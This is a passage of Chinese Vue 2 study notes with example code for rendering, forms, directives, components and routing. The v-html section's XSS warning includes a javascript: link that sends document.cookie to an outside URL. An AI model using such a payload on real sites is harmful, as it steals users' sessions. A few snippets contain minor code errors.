        </div>
    </body>

    <script type="text/javascript">
        Vue.config.productionTip = false

        const vm = new Vue({
            el:'#root',
            data:{
                name:'jojo',
                n:0
            }
        })
    </script>
</html>

```

### 9、列表渲染

#### 9.1 基本渲染

`v-for`指令：

1. 用于展示列表数据
2. 语法：`<li v-for="(item, index) in xxx" :key="yyy">`，其中key可以是index，也可以是遍历对象的唯一标识
3. 可遍历：数组、对象、字符串（用的少）、指定次数（用的少）

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<li v-for="(p,index) in persons" :key="index">
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) in car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<h2>遍历字符串</h2>
			<ul>
				<li v-for="(char,index) in str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<h2>遍历指定次数</h2>
			<ul>
				<li v-for="(number,index) in 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
    </body>
</html>

```

#### 9.2 key的作用与原理

![image-20230723194224505](./img/小米虫爬山路-img/image-20230723194224505.png)

![image-20230723194231310](./img/小米虫爬山路-img/image-20230723194231310.png)

1.虚拟DOM中key的作用：key是虚拟DOM中对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2.对比规则：

​	(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：

​		①.若虚拟DOM中内容没变, 直接使用之前的真实DOM

​		②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM

​	(2).旧虚拟DOM中未找到与新虚拟DOM相同的key：创建新的真实DOM，随后渲染到到页面

3.用index作为key可能会引发的问题：

​	(1).若对数据进行逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低

​	(2).若结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题

4.开发中如何选择key?

​	(1).最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值

​	(2).如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用index作为key是没有问题的

#### 9.3 列表过滤

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>列表过滤</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <div id="root">
            <h2>人员列表</h2>
            <input type="text" placeholder="请输入名字" v-model="keyWord">
            <ul>
                <li v-for="(p,index) of filPersons" :key="index">
                    {{p.name}}-{{p.age}}-{{p.sex}}
                </li>
            </ul>
        </div>

        <script type="text/javascript">
            Vue.config.productionTip = false

            new Vue({
                el:'#root',
                data:{
                    keyWord:'',
                    persons:[
                        {id:'001',name:'马冬梅',age:19,sex:'女'},
                        {id:'002',name:'周冬雨',age:20,sex:'女'},
                        {id:'003',name:'周杰伦',age:21,sex:'男'},
                        {id:'004',name:'温兆伦',age:22,sex:'男'}
                    ]
                },
                computed:{
                    filPersons(){
                        return this.persons.filter((p)=>{
                            return p.name.indexOf(this.keyWord) !== -1
                        })
                    }
                }
            })
        </script>
    </body>
</html>
```

#### 9.4 Vue数据监视

Vue监视数据的原理：

1.vue会监视data中所有层次的数据

2.如何监测对象中的数据？

通过setter实现监视，且要在new Vue时就传入要监测的数据

(1). 对象中后追加的属性，Vue默认不做响应式处理

(2). 如需给后添加的属性做响应式，请使用如下API：
​			Vue.set(target,propertyName/index,value)
​			vm.$set(target,propertyName/index,value)
​	3.如何监测数组中的数据？

通过包裹数组更新元素的方法实现，本质就是做了两件事：

(1). 调用原生对应的方法对数组进行更新

(2). 重新解析模板，进而更新页面

4.在Vue修改数组中的某个元素一定要用如下方法：

(1). 使用这些API：push()、pop()、shift()、unshift()、splice()、sort()、reverse()

(2). Vue.set() 或 vm.$set()

特别注意：Vue.set() 和 vm.$set() ==不能给vm 或 vm的根数据对象（data等） 添加属性==

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>Vue数据监视</title>
        <style>
            button{
                margin-top: 10px;
            }
        </style>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <div id="root">
            <h1>学生信息</h1>
            <button @click="student.age++">年龄+1岁</button><br/>
            <button @click="addSex">添加性别属性，默认值：男</button> <br/>
            <button @click="addFriend">在列表首位添加一个朋友</button> <br/>
            <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button><br/>
            <button @click="addHobby">添加一个爱好</button> <br/>
            <button @click="updateHobby">修改第一个爱好为：开车</button><br/>
            <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
            <h3>姓名：{{student.name}}</h3>
            <h3>年龄：{{student.age}}</h3>
            <h3 v-if="student.sex">性别：{{student.sex}}</h3>
            <h3>爱好：</h3>
            <ul>
                <li v-for="(h,index) in student.hobby" :key="index">
                    {{h}}
                </li>
            </ul>
            <h3>朋友们：</h3>
            <ul>
                <li v-for="(f,index) in student.friends" :key="index">
                    {{f.name}}--{{f.age}}
                </li>
            </ul>
        </div>
    </body>

    <script type="text/javascript">
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

        const vm = new Vue({
            el:'#root',
            data:{
                student:{
                    name:'tom',
                    age:18,
                    hobby:['抽烟','喝酒','烫头'],
                    friends:[
                        {name:'jerry',age:35},
                        {name:'tony',age:36}
                    ]
                }
            },
            methods: {
                addSex(){
                    //Vue.set(this.student,'sex','男')
                    this.$set(this.student,'sex','男')
                },
                addFriend(){
                    this.student.friends.unshift({name:'jack',age:70})
                },
                updateFirstFriendName(){
                    this.student.friends[0].name = '张三'
                },
                addHobby(){
                    this.student.hobby.push('学习')
                },
                updateHobby(){
                    this.student.hobby.splice(0,1,'开车')
                },
                removeSmoke(){
                    this.student.hobby = this.student.hobby.filter((h)=>{
                        return h !== '抽烟'
                    })
                }
            }
        })
    </script>
</html>

```

### 10、收集表单数据

收集表单数据：

- 若：`<input type="text"/>`，则`v-model`收集的是value值，用户输入的内容就是value值
- 若：`<input type="radio"/>`，则`v-model`收集的是value值，且要给标签配置value属性

- 若：`<input type="checkbox"/>`

  - 没有配置value属性，那么收集的是checked属性（勾选 or 未勾选，是布尔值）

  - 配置了value属性：
    - `v-model`的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - `v-model`的初始值是数组，那么收集的就是value组成的数组

`v-model`的三个修饰符：

1. lazy：失去焦点后再收集数据
2. number：输入字符串转为有效的数字
3. trim：输入首尾空格过滤

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>收集表单数据</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <div id="root">
            <form @submit.prevent="demo">
                账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
                密码：<input type="password" v-model="userInfo.password"> <br/><br/>
                年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
                性别：
                男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
                女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
                爱好：
                学习<input type="checkbox" v-model="userInfo.hobby" value="study">
                打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
                吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
                <br/><br/>
                所属校区：
                <select v-model="userInfo.city">
                    <option value="">请选择校区</option>
                    <option value="beijing">北京</option>
                    <option value="shanghai">上海</option>
                    <option value="shenzhen">深圳</option>
                    <option value="wuhan">武汉</option>
                </select>
                <br/><br/>
                其他信息：
                <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
                <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
                <button>提交</button>
            </form>
        </div>
    </body>

    <script type="text/javascript">
        Vue.config.productionTip = false

        new Vue({
            el:'#root',
            data:{
                userInfo:{
                    account:'',
                    password:'',
                    age:0,
                    sex:'female',
                    hobby:[],
                    city:'beijing',
                    other:'',
                    agree:''
                }
            },
            methods: {
                demo(){
                    console.log(JSON.stringify(this.userInfo))
                }
            }
        })
    </script>
</html>
```

### 11、过滤器

过滤器：

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
- 语法：
  1. 注册过滤器：`Vue.filter(name,callback)` 或 `new Vue({filters:{}})`
  2. 使用过滤器：`{{ xxx | 过滤器名}}` 或 `v-bind:属性 = "xxx | 过滤器名"`

- 备注：

  1. 过滤器可以接收额外参数，多个过滤器也可以串联

  2. 并没有改变原本的数据，而是产生新的对应的数据


```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>时间</h2>
            <h3>当前时间戳：{{time}}</h3>
            <h3>转换后时间：{{time | timeFormater()}}</h3>
			<h3>转换后时间：{{time | timeFormater('YYYY-MM-DD HH:mm:ss')}}</h3>
			<h3>截取年月日：{{time | timeFormater() | mySlice}}</h3>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,11)
		})
		new Vue({
            el:'#root',
            data:{
                time:1626750147900,
            },
			//局部过滤器
            filters:{
                timeFormater(value, str="YYYY年MM月DD日 HH:mm:ss"){
                    return dayjs(value).format(str)
                }
            }
        })
	</script>
</html>

```

### 12、内置指令

#### 12.1 之前的指令

之前学过的指令：

- v-bind：单向绑定解析表达式，可简写为:
- v-model：双向数据绑定
- v-for：遍历数组 / 对象 / 字符串
- v-on：绑定事件监听，可简写为@
- v-if：条件渲染（动态控制节点是否存存在）
- v-else：条件渲染（动态控制节点是否存存在）
- v-show：条件渲染 (动态控制节点是否展示)

#### 12.1 v-text指令

- `v-text`指令：
  1. 作用：向其所在的节点中渲染文本内容，只会有文本，不会解析
  2. 与插值语法的区别：`v-text`会替换掉节点中的内容，`{{xx}}`则不会。

#### 12.2 v-html指令

`v-html`指令：

1. 作用：向指定节点中渲染包含html结构的内容
2. 与插值语法的区别：
   1. `v-html`会替换掉节点中所有的内容，`{{xx}}`则不会
   2. `v-html`可以识别html结构，

3. 严重注意：`v-html`有安全性问题！！
   1. 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
   2. 一定要在可信的内容上使用`v-html`，永远不要用在用户提交的内容上！！！

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<div>Hello，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'JOJO',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>

```

#### 12.3 v-cloak指令

`v-cloak`指令（没有值）：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性
2. 使用css配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题

#### 12.4 v-once指令

`v-once`指令：

1. `v-once`所在节点在初次动态渲染后，就视为静态内容了
2. 以后数据的改变不会引起`v-once`所在结构的更新，可以用于优化性能

#### 12.5 v-pre指令

`v-pre`指令：

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

#### 12.6 自定义指令

1.自定义指令定义语法：

​	1.局部指令：

```js
 new Vue({															
 	directives:{指令名:配置对象}   
 }) 		

 new Vue({															
 	directives:{指令名:回调函数}   
 }) 	

```

​	2.全局指令:

1. `Vue.directive(指令名,配置对象)`

2. `Vue.directive(指令名,回调函数)`

例如

```js
Vue.directive('fbind',{
	//指令与元素成功绑定时（一上来）
	bind(element,binding){
		element.value = binding.value
	},
    //指令所在元素被插入页面时
    inserted(element,binding){
    	element.focus()
    },
    //指令所在的模板被重新解析时
    update(element,binding){
    	element.value = binding.value
    }
})

```

3.配置对象中常用的3个回调函数：

- bind(element,binding)：指令与元素成功绑定时调用

- inserted(element,binding)：指令所在元素被插入页面时调用
- update(element,binding)：指令所在模板结构被重新解析时调用

4.备注：

- 指令定义时不加“v-”，但使用时要加“v-”
- 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名

```js
new Vue({
	el:'#root',
	data:{
		n:1
	},
	directives:{
		'big-number'(element,binding){
			element.innerText = binding.value * 10
		}
	}
})
```

### 13、生命周期

#### 13.1 引出生命周期

生命周期：----函数

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
4. 生命周期函数中的this指向是vm 或 组件实例对象

#### 13.2  分析生命周期

![image-20230724143618329](./img/小米虫爬山路-img/image-20230724143618329.png)

熟悉生命周期图	

#### 13.3 总结生命周期

**总结：**

常用的生命周期钩子：

1. `mounted`：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作
2. `beforeDestroy`：清除定时器、解绑自定义事件、取消订阅消息等收尾工作

关于销毁Vue实例：

1. 销毁后借助Vue开发者工具看不到任何信息
2. 销毁后自定义事件会失效，但原生DOM事件依然有效
3. 一般不会在`beforeDestroy`操作数据，因为即便操作数据，也不会再触发更新流程了

### 14 Vue组件化编程

#### 14.1 模块与组件、模块化与组件化

![image-20230724152442708](./img/小米虫爬山路-img/image-20230724152442708.png)

![image-20230724152506398](./img/小米虫爬山路-img/image-20230724152506398.png)

##### 14.1.1 模块

1. 理解：向外提供特定功能的 js 程序，一般就是一个 js 文件
2. 为什么：js 文件很多很复杂
3. 作用：复用 js，简化 js 的编写，提高 js 运行效率

##### 14.1.2 组件

1. 定义：用来实现局部功能的代码和资源的集合（html/css/js/image…）
2. 为什么：一个界面的功能很复杂
3. 作用：复用编码，简化项目编码，提高运行效率

##### 14.1.3 模块化

当应用中的 js 都以模块来编写的，那这个应用就是一个模块化的应用

##### 14.1.4 组件化

当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用

#### 14.2 非单文件组件

##### 14.2.1 基本使用

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
            //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			}
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'JOJO',
					age:20
				}
			}
		})
		
		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好，JOJO！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,
				student
			}
		})
	</script>
</html>

```

非单文件组件：一个文件中有n个组件。

Vue中使用组件的三大步骤：

1. 定义组件(创建组件)

2. 注册组件

3. 使用组件(写组件标签)


如何定义一个组件？

使用`Vue.extend(options)`创建，其中`options`和`new Vue(options)`时传入的`options`几乎一样，但也有点区别：

1. el不要写，为什么？

   最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器

2. data必须写成函数，为什么？

   避免组件被复用时，数据存在引用关系

   

如何注册组件？

1. 局部注册：`new Vue`的时候传入`components`选项

2. 全局注册：`Vue.component('组件名',组件)`

   

编写组件标签：`<school></school>`

##### 14.2.2 组件注意事项

关于组件名：

- 一个单词组成：
  - 第一种写法（首字母小写）：school
  - 第二种写法（首字母大写）：School

- 多个单词组成：
  - 第一种写法（kebab-case命名）：my-school
  - 第二种写法（CamelCase命名）：MySchool （需要Vue脚手架支持）
- 备注：
  - 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行
  - 可以使用name配置项指定组件在开发者工具中呈现的名字

关于组件标签：

- 第一种写法：`<school></school>`
- 第二种写法：`<school/>`
- 备注：不使用脚手架时，`<school/>`会导致后续组件不能渲染

一个简写方式：`const school = Vue.extend(options)`可简写为：`const school = options`

##### 14.2.4 VueComponent

关于VueComponent：

1. school组件本质是一个名为`VueComponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的
2. 我们只需要写`<school/>`或`<school></school>`，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：`new VueComponent(options)`
3. 特别注意：每次调用`Vue.extend`，返回的都是一个全新的VueComponent！
4. 关于this指向：
   1. 组件配置中：`data`函数、`methods`中的函数、`watch`中的函数、`computed`中的函数 它们的this均是VueComponent实例对象
   2. `new Vue(options)`配置中：`data`函数、`methods`中的函数、`watch`中的函数、`computed`中的函数 它们的this均是Vue实例对象

5. `VueComponent`的实例对象，以后简称vc（也可称之为：组件实例对象），`Vue`的实例对象，以后简称vm

> 只有在本笔记中`VueComponent`的实例对象才简称为vc

##### 14.2.5 一个重要的内置关系

![image-20230724165126772](./img/小米虫爬山路-img/image-20230724165126772.png)

1. 一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue 原型上的属性、方法

#### 14.3 单文件组件

单文件组件：一个文件中只有1个组件

一个文件中要有html、css、js三个结构

```vue
<template>
   <!-- 组件结构 -->
</template>

<script>
// 组件交互相关的代码（数据、方法等）
</script>

<style>
/* 组件样式 */
</style>
```



```vue
//school
<template>
    <div id='Demo'>
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
        <button @click="showName">点我提示学校名</button>
    </div>
</template>

<script>
    export default {
        name:'School',
        data() {
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        methods: {
            showName(){
                alert(this.name)
            }
        },
    }
</script>

<style>
    #Demo{
        background: orange;
    }
</style>

```



```vue
//App
<template>
    <div>
        <School></School>
        <Student></Student>
    </div>
</template>

<script>
    import School from './School.vue'
    import Student from './Student.vue'

    export default {
        name:'App',
        components:{
            School,
            Student
        }
    }
</script>

```



```javascript
import App from './App.vue'

new Vue({
    template:`<App></App>`,
    el:'#root',
    components:{App}
})

```



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>单文件组件练习</title>
</head>
<body>
    <div id="root"></div>
    <script src="../../js/vue.js"></script>
    <script src="./main.js"></script>
</body>
</html>

```

> 注意:在浏览器中不能使用ES6语法，所以上述的代码不能运行

### 15、使用Vue CLI脚手架

#### 15.1 创建项目步骤

第一步：全局安装@vue/cli：`npm install -g @vue/cli`

第二步：切换到你要创建项目的目录，然后使用命令创建项目：`vue create xxxx`

第三步：选择使用vue的版本

第四步：启动项目：`npm run serve`

#### 15.2 目录分析

```markdown
.文件目录
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   └── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
└── package-lock.json: 包版本控制文件
```

#### 15.3 render函数

```javascript
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
    el:'#app',
    // 简写形式
	render: h => h(App),
    // 完整形式
	// render(createElement){
	//     return createElement(App)
	// }
})

```

关于不同版本的函数：

`vue.js` 与 `vue.runtime.xxx.js`的区别：

​	`vue.js` 是完整版的 Vue，包含：核心功能+模板解析器

​	`vue.runtime.xxx.js` 是运行版的 Vue，只包含核心功能，没有模板解析器

因为 `vue.runtime.xxx.js` 没有模板解析器，所以不能使用 `template` 配置项，需要使用 `render`函数接收到的`createElement` 函数去指定具体内容

#### 15.4 修改默认配置

- `vue.config.js` 是一个可选的配置文件，如果项目的（和 `package.json` 同级的）根目录中存在这个文件，那么它会被 `@vue/cli-service` 自动加载
- 使用 `vue.config.js` 可以对脚手架进行个性化定制，详见[配置参考 | Vue CLI](https://cli.vuejs.org/zh/config/#vue-config-js)

```javascript
module.exports = {
    pages: {
        index: {
            // 入口
            entry: 'src/index/main.js'
        }
    },
  // 关闭语法检查
 lintOnSave: false
}
```

> Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置，请执行：`vue inspect > output.js`

### 16、ref属性

`ref`属性：

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在`html`标签上获取的是真实DOM元素，应用在组件标签上获取的是组件实例对象（vc）
3. 使用方式:
   1. 打标识：`<h1 ref="xxx"></h1>` 或 `<School ref="xxx"></School>`
   2. 获取：`this.$refs.xxx`

```vue
<template>
    <div>
        <h1 ref="title">{{msg}}</h1>
        <School ref="sch"/>
        <button @click="show" ref="btn">点我输出ref</button>
    </div>
</template>

<script>
    import School from './components/School.vue'
    export default {
        name:'App',
        components: { School },
        data() {
            return {
                msg:'欢迎学习Vue！'
            }
        },
        methods:{
            show(){
                console.log(this.$refs.title)
                console.log(this.$refs.sch)
                console.log(this.$refs.btn)
            }
        }
    }
</script>
```

### 17、组件通信

#### 17.1 props配置项

`props`配置项：

1. 功能：让组件接收外部传过来的数据

2. 传递数据：`<Demo name="xxx"/>`

3. 接收数据：
   1. 第一种方式（只接收）：`props:['name']`
   
   2. 第二种方式（限制数据类型）：`props:{name:String}`
   
   3. 第三种方式（限制类型、限制必要性、指定默认值）：
   
      ```js
      props:{
          name:{
              type:String, //类型
                  required:true, //必要性
                      default:'JOJO' //默认值
          }
      }
      
      ```

> props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据

==注意：要在子组件中修改父组件的数据，就要传入修改父组件数据的方法（函数）==

#### 17.2 自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```
   2. 第二种方式，在父组件中：

   ```javascript
   <Demo ref="demo"/>
   ......
   mounted(){
      this.$refs.xxx.$on('atguigu',this.test)
   }
   ```

   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		
5. 解绑自定义事件```this.$off('atguigu')```
6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。
7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！

#### 17.3 全局事件总线

全局事件总线是一种可以在任意组件间通信的方式，本质上就是一个对象。它必须满足以下条件：

1. ==所有的组件对象都必须能看见他==

2. ==这个对象必须能够使用`$on`、`$emit`和`$off`方法去绑定、触发和解绑事件==



1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线，在main.js中：

```js
new Vue({
    //...
    beforeCreate(){
        Vue.prototype.$bus = this //安装全局事件总线，就是当前的this
    },
    //...
})
```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

   ```js
   export default{
       name:"A",
       methods:{
           sendMsg(msg){
               //发送消息
               console.log(msg)
           },
       },
       mounted() {
           this.$bus.$on('sendMsg',this.sendMsg) //绑定sendMsg这个方法
       }//这里的回调函数时A组件帮助你调用的。
   }
   ```

   2. 提供数据：B组件发送数据

   ```js
   export default{
       name:"B",
       //在methods中触发sendMsg
       data(){
           return {
               msg:'这是一条消息'
           }
       },
       mounted:{
           sendMsgAction(){
               this.$bus.$emit('sendMsg',this.msg) //触发事件
           }
       }
   }
   ```

4. 一定要在A组件中的beforeDestroy钩子，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。



### 18、mixin混入

1. 功能：可以把多个组件共用的配置提取成一个混入对象
2. 使用方式：
   1. 定义混入：

```js
const mixin = {
    data(){....},
    methods:{....}
    ....
}
```

​	2.使用混入：

1. 全局混入：`Vue.mixin(xxx)`
2. 局部混入：`mixins:['xxx']`

注意：

- 组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”，在发生冲突时以组件优先。
- 同名生命周期钩子将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。

### 19、scoped样式

**总结：**

`scoped`样式：

1. 作用：让样式在局部生效，防止冲突
2. 写法：`<style scoped>`

> `scoped`样式一般不会在`App.vue`中使用

### 20、$nextTick

`$nextTick(回调函数)`可以将回调延迟到下次 DOM 更新循环之后执行

### 21、Vue路由

Vue Router是Vue.js的官方路由。它与Vue.js核心深度集成，让用Vue.js构建单页应用变得轻而易举

#### 21.1 使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

```java
src
    router
    	index.js
```

```js
import VueRouter from 'vue-router'
//引入要交给router管理的页面
import HelloWorld from '../components/HelloWorld'
import Test from '../components/Test'

//用于承载引入的两个页面的配置
const routes = [
  {
    //指定路径
    path: '/Hello',
    //指定这个路径下访问的是按个页面
    component: HelloWorld
  },
  {
    path: '/Test',
    component: Test
  }
]

const router = new VueRouter({
  routes
})

//导出，在main.js中引入
export default router
```

在main.js中引入router

```js
import Vue from 'vue'
import App from './App.vue'
import router from "./router"
import VueRouter from 'vue-router'

Vue.config.productionTip = false
Vue.use(VueRouter)
new Vue({
  render: h => h(App),
  router: router
}).$mount('#app')
```

4. 实现切换（active-class可配置高亮样式）在App.js中写

```html
<router-link active-class="active" to="/about">About</router-link>
```

5. 指定组件呈现位置

```html
<router-view></router-view>
```

注意点：

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

#### 21.2 多级路由

1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News 
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```html
   <router-link to="/home/news">News</router-link>
   ```

3. 指定展示位置

   ```html
   <router-view></router-view>
   ```


#### 21.3 路由的query参数

1. 传递参数

   ```html
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```html
   $route.query.id
   $route.query.title
   ```

#### 21.4 命名路由

作用：可以简化路由的跳转。

1. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                          name:'hello', //给路由命名
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```html
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```

#### 21.5 编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API  对要跳转的按钮或者其他的逐渐添加onclick
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
